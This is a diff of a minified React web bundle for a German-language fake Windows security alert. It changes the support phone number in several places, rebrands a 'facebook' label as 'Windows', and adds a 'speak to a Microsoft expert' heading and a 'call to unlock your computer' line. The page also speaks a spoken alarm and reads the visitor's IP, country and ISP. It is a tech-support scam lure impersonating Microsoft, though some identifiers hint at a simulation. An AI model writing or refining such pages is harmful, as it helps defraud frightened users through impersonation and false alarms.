@@ -12674,7 +12674,7 @@ const hh = "/images/XXR_MIC.png"
   , vh = [hh, Dr, yh, Au, Nr, hf, Ur];
 function gh({active: T, onLog: Q, closeSim: B}) {
     const {ip: r, country: O, isp: H} = rh()
-      , R = "0307-001-2379"
+      , R = "0800 182 0001"
       , [ol,N] = ll.useState(!1)
       , [E,X] = ll.useState(!0)
       , U = ll.useRef(null);
@@ -12904,7 +12904,7 @@ function gh({active: T, onLog: Q, closeSim: B}) {
                             fontWeight: 700,
                             color: "#1877f2"
                         },
-                        children: "facebook"
+                        children: "Windows 🪟"
                     }), f.jsx("span", {
                         style: {
                             fontSize: "12px",
@@ -13360,12 +13360,12 @@ function gh({active: T, onLog: Q, closeSim: B}) {
                 children: "✕"
             }), f.jsx("h2", {
                 style: {
-                    fontSize: 24,
+                    fontSize: 35,
                     fontWeight: 400,
                     color: "white",
                     marginBottom: 20
                 },
-                children: "Authentifizierung erforderlich"
+                children: "Jetzt mit einem Microsoft-Experten sprechen"
             }), f.jsx("p", {
                 style: {
                     fontSize: 14,
@@ -13412,6 +13412,11 @@ function gh({active: T, onLog: Q, closeSim: B}) {
                 children: [f.jsx("h2", {
                     className: "sim-main-alert",
                     children: "Der Zugriff auf diesen PC wurde vorübergehend ausgesetzt"
+                }), f.jsx("h4", {
+                    style: {
+                        marginBottom: 20
+                    },
+                    children: "Um Ihren Computer zu entsperren, rufen Sie bitte 0800 18 20001 an."
                 }), f.jsx("p", {
                     style: {
                         marginBottom: 20
@@ -13563,7 +13568,7 @@ function bh() {
         T.play();
         const H = () => {
             const R = new SpeechSynthesisUtterance;
-            R.text = "Kritische Windows-Sicherheit. Beschädigtes System. Bitte rufen Sie den Support unter 0307-001-2379 an.",
+            R.text = "Kritische Windows-Sicherheit. Beschädigtes System. Bitte rufen Sie den Support unter 0800 182 0001 an.",
             R.lang = "de-DE",
             R.rate = .9,
             R.pitch = 1,
@@ -13764,7 +13769,7 @@ function bh() {
                                 transition: "color 0.3s",
                                 letterSpacing: "1px"
                             },
-                            children: "0307-001-2379"
+                            children: "0800 182 0001"
                         }), f.jsx("p", {
                             style: {
                                 fontSize: "11px",
@@ -13903,7 +13908,7 @@ function Eh() {
                         style: Dl.phoneContainer,
                         children: [f.jsx("span", {
                             style: Dl.phone,
-                            children: "0307-001-2379"
+                            children: "0800 182 0001"
                         }), f.jsx("span", {
                             style: Dl.subPhone,
                             children: "Rufen Sie den Support jetzt an, um abzuschließen"
